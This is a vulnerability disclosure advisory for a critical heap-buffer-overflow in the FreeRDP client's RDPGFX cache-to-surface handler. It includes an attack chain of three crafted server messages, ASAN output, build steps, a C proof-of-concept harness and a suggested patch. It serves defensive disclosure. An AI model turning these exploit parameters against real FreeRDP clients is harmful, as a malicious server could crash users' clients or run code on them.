<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-RXYVE4DZ -->

# ANT-2026-RXYVE4DZ · freerdp/freerdp

## heap-buffer-overflow critical

[CVE-2026-40033](https://nvd.nist.gov/vuln/detail/CVE-2026-40033)
[CVE-2026-44421](https://nvd.nist.gov/vuln/detail/CVE-2026-44421)
[GHSA-mpxh-8fq3-x8mh](https://github.com/advisories/GHSA-mpxh-8fq3-x8mh)
[GHSA-mvpx-xj7r-3p3r](https://github.com/advisories/GHSA-mvpx-xj7r-3p3r)
[GHSA-p6r2-4hgm-m6ff](https://github.com/advisories/GHSA-p6r2-4hgm-m6ff)

Claude critical
Security research firm critical (revised; sealed as high)
Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.

# ANT-2026-RXYVE4DZ: Heap-buffer-overflow in sanitizer\_common\_interceptors.inc:827

In FreeRDP's RDPGFX handler, gdi\_CacheToSurface (libfreerdp/gdi/gfx.c:1552) validates a destination rectangle that has been clamped to UINT16\_MAX, but then passes the original unclamped cacheEntry->width/height to freerdp\_image\_copy\_no\_overlap. A malicious RDP server can send a CreateSurface (65535x1), a SurfaceToCache producing a 65535-wide cache entry, and a CacheToSurface with destPt={65534,15}; the clamped rect passes validation while the real copy writes ~262,140 bytes past a ~4 MiB heap buffer allocated in gdi\_CreateSurface. The attacker controls the surface dimensions, cache-entry size, and destination point via standard RDPGFX PDUs. The result is a large attacker-influenced heap write on the client, reproduced 3/3 under ASAN.

**Project:** freerdp
**Location:** `sanitizer_common_interceptors.inc:827`

ASAN: heap-buffer-overflow WRITE of size 262140, 0 bytes to the right of a 4194344-byte region allocated by winpr\_aligned\_malloc in gdi\_CreateSurface (gfx.c:1200). The bounds check clamps (destPt.x + cacheEntry->width) to UINT16\_MAX before validating against the surface, so a destPt.x of 65534 plus a width of 65535 appears in-bounds; the subsequent freerdp\_image\_copy\_no\_overlap uses the unclamped width and writes far past the end of the surface buffer.

**Crash trace:**

```
The PoC is a well-crafted C program that demonstrates a heap-buffer-overflow WRITE vulnerability in FreeRDP's `gdi_CacheToSurface` function (`libfreerdp/gdi/gfx.c:1552`).

**Root cause:** `gdi_CacheToSurface` validates a *clamped* bounding rectangle (clamped to UINT16_MAX) but passes the *original unclamped* `cacheEntry->width/height` to `freerdp_image_copy_no_overlap`. When `destPt->x` is large (65534) and `cacheEntry->width` is also large (65535), the validation passes because the clamped rect fits within the surface, but the actual copy writes far beyond the allocated buffer.

**Attack chain:** Three RDPGFX PDUs that can be sent by a malicious server to a client:
1. CreateSurface (width=65535, height=1) — allocates a 4,194,304-byte buffer
2. SurfaceToCache (rect={0,0,65535,1}) — creates a cache entry with width=65535
3. CacheToSurface (destPt={65534,15}) — triggers the overflow: writes 262,140 bytes starting at offset 4,194,296, overflowing the buffer by ~262,132 bytes

**Reproduction results (3/3 runs):**
- All 3 runs: ASAN `heap-buffer-overflow` WRITE of size 262140
- All 3 runs: exit code 1 (ASAN abort)
- Stack trace consistently shows: `main` -> `gdi_CacheToSurface` (gfx.c:1552) -> `freerdp_image_copy_no_overlap` (color.c:1908) -> `generic_image_copy_no_overlap_memcpy` (prim_copy.c:285) -> `__interceptor_memcpy`
- Buffer allocated in `gdi_CreateSurface` (gfx.c:1200) via `winpr_aligned_malloc`
- "0 bytes to the right of 4194344-byte region" confirms overflow at exact buffer boundary
```

1. Send RDPGFX CreateSurface with width=65535, height=1 (allocates ~4,194,304-byte surface buffer)
2. Send RDPGFX SurfaceToCache with rect {0,0,65535,1} to create a cache entry of width=65535
3. Send RDPGFX CacheToSurface with destPt={65534,15}; clamped rect passes validation but memcpy writes 262,140 bytes starting at offset ~4,194,296, overflowing by ~262,132 bytes

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-RXYVE4DZ.

---

**Reference:** ANT-2026-RXYVE4DZ

Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer. The severity shown is the firm's current assessment; the report was sealed with the firm's earlier assessment of high.

:   critical (revised; sealed as high)

### Summary

A malicious RDP server can trigger a heap-buffer-overflow write in the FreeRDP client by sending crafted RDPGFX PDUs. The bug is in `gdi_CacheToSurface`: it validates a destination rectangle that is clamped to `UINT16_MAX`, but then performs the copy using the original `cacheEntry->width/height`. This can cause a large out-of-bounds heap write and may lead to client crashes or code execution.

This bug is reachable from a malicious RDP server, but only when the client has RDPGFX enabled. The C PoC is just a local harness that calls the exact same FreeRDP handlers that are normally triggered by server-sent RDPGFX PDUs.

### Details

In FreeRDP commit `23b36cd00ebf0ccd97750fcdbc9aa2f362352da7`:

1. `gdi_CreateSurface` aligns the surface dimensions up to 16. `surface->width = gfx_align_scanline(createSurface->width, 16)` and `surface->height = gfx_align_scanline(createSurface->height, 16)`. So a server-supplied `CreateSurface(width=65535,height=1)` results in an allocated surface of `65536x16` pixels.
2. `gdi_CacheToSurface` builds a `RECTANGLE_16` using clamped right/bottom edges. Because `rect.right` is clamped to `UINT16_MAX`, the rectangle validation can succeed even when the *actual* copy width/height would extend past the surface.

Concrete crash parameters (**attacker-controlled** via standard RDPGFX messages): create a surface with `createSurface->width=65535`, `createSurface->height=1`, create a cache entry with `cacheEntry->width=65535`, `cacheEntry->height=1`, send `CacheToSurface` with `destPt={ x=65534, y=15 }`.

### PoC

This reproducer does not require a live RDP server. It simulates the exact bounds check used by `gdi_CacheToSurface` and then calls `freerdp_image_copy_no_overlap` with the same parameters `gdi_CacheToSurface` would pass.

Tested against FreeRDP commit `23b36cd00ebf0ccd97750fcdbc9aa2f362352da7` on Linux.

1) Build FreeRDP with ASAN/UBSAN (disable optional dependencies that are not needed for this PoC):

```
git clone https://github.com/FreeRDP/FreeRDP.git /tmp/freerdp-src
cd /tmp/freerdp-src
git checkout 23b36cd00ebf0ccd97750fcdbc9aa2f362352da7

mkdir build-asan && cd build-asan
cmake .. \
  -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS='-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined' \
  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \
  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined' \
  -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DWITH_FUSE=OFF \
  -DWITH_SERVER=OFF -DWITH_SAMPLE=OFF -DWITH_SHADOW=OFF -DWITH_PROXY=OFF \
  -DWITH_CLIENT_SDL=OFF -DWITH_WAYLAND=OFF -DCHANNEL_URBDRC=OFF -DBUILD_TESTING=OFF
make -j"$(nproc)"
```

2) Save this as `poc_505.c` (for example in `/tmp/poc_505.c`):

```
#include <freerdp/types.h>
#include <freerdp/codec/color.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static uint32_t gfx_align_scanline(uint32_t widthInBytes, uint32_t alignment)
        const uint32_t align = alignment;
        const uint32_t pad = align - (widthInBytes % alignment);
        uint32_t scanline = widthInBytes;

        if (align != pad)
                scanline += pad;

        return scanline;

static BOOL is_rect_valid(const RECTANGLE_16* rect, size_t width, size_t height)
        if (!rect)
                return FALSE;
        if ((rect->left > rect->right) || (rect->right > width))
                return FALSE;
        if ((rect->top > rect->bottom) || (rect->bottom > height))
                return FALSE;
        return TRUE;

int main(void)
        const uint16_t destX = 65534;
        const uint16_t destY = 15;
        const uint32_t cacheWidth = 65535;
        const uint32_t cacheHeight = 1;

        const uint32_t surfaceWidth = gfx_align_scanline(65535, 16); /* 65536 */
        const uint32_t surfaceHeight = gfx_align_scanline(1, 16);    /* 16 */
        const uint32_t surfaceScanline = gfx_align_scanline(surfaceWidth * 4U, 16);
        const size_t surfaceSize = (size_t)surfaceScanline * surfaceHeight;

        BYTE* surfaceData = (BYTE*)malloc(surfaceSize);
        if (!surfaceData)
                return 1;
        memset(surfaceData, 0x41, surfaceSize);

        const uint32_t cacheScanline = gfx_align_scanline(cacheWidth * 4U, 16);
        const size_t cacheSize = (size_t)cacheScanline * cacheHeight;

        BYTE* cacheData = (BYTE*)malloc(cacheSize);
        if (!cacheData)
                free(surfaceData);
                return 1;
        memset(cacheData, 0x42, cacheSize);

        const RECTANGLE_16 rect = { destX, destY,
                (UINT16)MIN(UINT16_MAX, (uint32_t)destX + cacheWidth),
                (UINT16)MIN(UINT16_MAX, (uint32_t)destY + cacheHeight) };

        if (!is_rect_valid(&rect, surfaceWidth, surfaceHeight))
                fprintf(stderr, "rect unexpectedly invalid\n");
                free(cacheData);
                free(surfaceData);
                return 1;

        /* This mirrors the vulnerable call site in gdi_CacheToSurface. */
        freerdp_image_copy_no_overlap(surfaceData, PIXEL_FORMAT_BGRA32, surfaceScanline, destX, destY,
                                     cacheWidth, cacheHeight, cacheData, PIXEL_FORMAT_BGRA32,
                                     cacheScanline, 0, 0, NULL, FREERDP_FLIP_NONE);

        free(cacheData);
        free(surfaceData);
        return 0;
```

3) Compile and run:

```
cd /tmp/freerdp-src/build-asan

gcc -g -O1 -fsanitize=address,undefined \
  -I../include -I./include -I../winpr/include -I./winpr/include \
  /tmp/poc_505.c \
  -L./libfreerdp -L./winpr/libwinpr -lfreerdp3 -lwinpr3 \
  -Wl,-rpath,./libfreerdp:./winpr/libwinpr -o /tmp/poc_505

ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:halt_on_error=1:print_stacktrace=1' \
  LD_LIBRARY_PATH=./libfreerdp:./winpr/libwinpr \
  /tmp/poc_505
```

Expected result: ASAN reports a `heap-buffer-overflow` with `WRITE of size 262140`.

### Suggested fix

Add bounds checks based on the real (unclamped) copy dimensions before calling `freerdp_image_copy_no_overlap`.

```
diff --git a/libfreerdp/gdi/gfx.c b/libfreerdp/gdi/gfx.c
index feec35967..aaad7b349 100644
--- a/libfreerdp/gdi/gfx.c
+++ b/libfreerdp/gdi/gfx.c
@@ -1659,6 +1659,11 @@ static UINT gdi_CacheToSurface(RdpgfxClientContext* context,
                if (!is_rect_valid(&rect, surface->width, surface->height))
                        goto fail;
+
+               if ((UINT32)destPt->x + cacheEntry->width > surface->width)
+                       goto fail;
+               if ((UINT32)destPt->y + cacheEntry->height > surface->height)
+                       goto fail;

                if (!freerdp_image_copy_no_overlap(surface->data, surface->format, surface->scanline,
                                                   destPt->x, destPt->y, cacheEntry->width,
                                                   cacheEntry->height, cacheEntry->data, cacheEntry->format,
```

### Impact

This is a heap-buffer-overflow write in the FreeRDP client and any user or application using FreeRDP (for example `xfreerdp`) connecting to an attacker-controlled RDP server that negotiates RDPGFX is impacted.
At minimum an attacker get remote crash (DoS) of the FreeRDP client (which is not a high severity in that context), but and potentially code execution in the context of the client process, because the attacker controls a large out-of-bounds heap write (size and content come from server-controlled cached pixel data). A server can control the exact fields that lead into `gdi_CacheToSurface`, and the bug is on the real server->client message path.

**Background of that issue**
This bug was found as a part of an Anthropic research into the use of large language models for automated vulnerability discovery in open source software. Anthropic then engaged Trail of Bits to independently triage and validate those issues.

1. 2026-03-24
2. 2026-04-30
3. 2026-04-30
4. 2026-05-11
5. 2026-05-20

0c44262d039d2d96e1bca18c6ba2921c2566dcd498a233f42d427dd2b208cf3b6ebd2e0cb0c30267ec4d9c5269de8379573ba271aeeda56757340fab7ff84161

Committed 2026-04-30 00:03 PT

Revealed 2026-05-20 00:40 PT

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-RXYVE4DZ%22%2C%22bug_class%22%3A%22Heap-buffer-overflow%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-24T20%3A44%3A05%2B00%3A00%22%2C%22description%22%3A%22In%20FreeRDP%27s%20RDPGFX%20handler%2C%20gdi_CacheToSurface%20%28libfreerdp/gdi/gfx.c%3A1552%29%20validates%20a%20destination%20rectangle%20that%20has%20been%20clamped%20to%20UINT16_MAX%2C%20but%20then%20passes%20the%20original%20unclamped%20cacheEntry-%3Ewidth/height%20to%20freerdp_image_copy_no_overlap.%20A%20malicious%20RDP%20server%20can%20send%20a%20CreateSurface%20%2865535x1%29%2C%20a%20SurfaceToCache%20producing%20a%2065535-wide%20cache%20entry%2C%20and%20a%20CacheToSurface%20with%20destPt%3D%7B65534%2C15%7D%3B%20the%20clamped%20rect%20passes%20validation%20while%20the%20real%20copy%20writes%20~262%2C140%20bytes%20past%20a%20~4%20MiB%20heap%20buffer%20allocated%20in%20gdi_CreateSurface.%20The%20attacker%20controls%20the%20surface%20dimensions%2C%20cache-entry%20size%2C%20and%20destination%20point%20via%20standard%20RDPGFX%20PDUs.%20The%20result%20is%20a%20large%20attacker-influenced%20heap%20write%20on%20the%20client%2C%20reproduced%203/3%20under%20ASAN.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22sanitizer_common_interceptors.inc%3A827%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp%22%2C%22reproduction%22%3A%5B%221.%20Send%20RDPGFX%20CreateSurface%20with%20width%3D65535%2C%20height%3D1%20%28allocates%20~4%2C194%2C304-byte%20surface%20buffer%29%22%2C%222.%20Send%20RDPGFX%20SurfaceToCache%20with%20rect%20%7B0%2C0%2C65535%2C1%7D%20to%20create%20a%20cache%20entry%20of%20width%3D65535%22%2C%223.%20Send%20RDPGFX%20CacheToSurface%20with%20destPt%3D%7B65534%2C15%7D%3B%20clamped%20rect%20passes%20validation%20but%20memcpy%20writes%20262%2C140%20bytes%20starting%20at%20offset%20~4%2C194%2C296%2C%20overflowing%20by%20~262%2C132%20bytes%22%5D%2C%22technical_details%22%3A%22ASAN%3A%20heap-buffer-overflow%20WRITE%20of%20size%20262140%2C%200%20bytes%20to%20the%20right%20of%20a%204194344-byte%20region%20allocated%20by%20winpr_aligned_malloc%20in%20gdi_CreateSurface%20%28gfx.c%3A1200%29.%20The%20bounds%20check%20clamps%20%28destPt.x%20%2B%20cacheEntry-%3Ewidth%29%20to%20UINT16_MAX%20before%20validating%20against%20the%20surface%2C%20so%20a%20destPt.x%20of%2065534%20plus%20a%20width%20of%2065535%20appears%20in-bounds%3B%20the%20subsequent%20freerdp_image_copy_no_overlap%20uses%20the%20unclamped%20width%20and%20writes%20far%20past%20the%20end%20of%20the%20surface%20buffer.%22%2C%22title%22%3A%22Heap-buffer-overflow%20in%20sanitizer_common_interceptors.inc%3A827%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-RXYVE4DZ",
  "bug_class": "Heap-buffer-overflow",
  "claude_severity": "critical",
  "created_at": "2026-03-24T20:44:05+00:00",
  "description": "In FreeRDP's RDPGFX handler, gdi_CacheToSurface (libfreerdp/gdi/gfx.c:1552) validates a destination rectangle that has been clamped to UINT16_MAX, but then passes the original unclamped cacheEntry->width/height to freerdp_image_copy_no_overlap. A malicious RDP server can send a CreateSurface (65535x1), a SurfaceToCache producing a 65535-wide cache entry, and a CacheToSurface with destPt={65534,15}; the clamped rect passes validation while the real copy writes ~262,140 bytes past a ~4 MiB heap buffer allocated in gdi_CreateSurface. The attacker controls the surface dimensions, cache-entry size, and destination point via standard RDPGFX PDUs. The result is a large attacker-influenced heap write on the client, reproduced 3/3 under ASAN.",
  "location": "sanitizer_common_interceptors.inc:827",
  "project": "freerdp",
    "1. Send RDPGFX CreateSurface with width=65535, height=1 (allocates ~4,194,304-byte surface buffer)",
    "2. Send RDPGFX SurfaceToCache with rect {0,0,65535,1} to create a cache entry of width=65535",
    "3. Send RDPGFX CacheToSurface with destPt={65534,15}; clamped rect passes validation but memcpy writes 262,140 bytes starting at offset ~4,194,296, overflowing by ~262,132 bytes"
  "technical_details": "ASAN: heap-buffer-overflow WRITE of size 262140, 0 bytes to the right of a 4194344-byte region allocated by winpr_aligned_malloc in gdi_CreateSurface (gfx.c:1200). The bounds check clamps (destPt.x + cacheEntry->width) to UINT16_MAX before validating against the surface, so a destPt.x of 65534 plus a width of 65535 appears in-bounds; the subsequent freerdp_image_copy_no_overlap uses the unclamped width and writes far past the end of the surface buffer.",
  "title": "Heap-buffer-overflow in sanitizer_common_interceptors.inc:827",
```
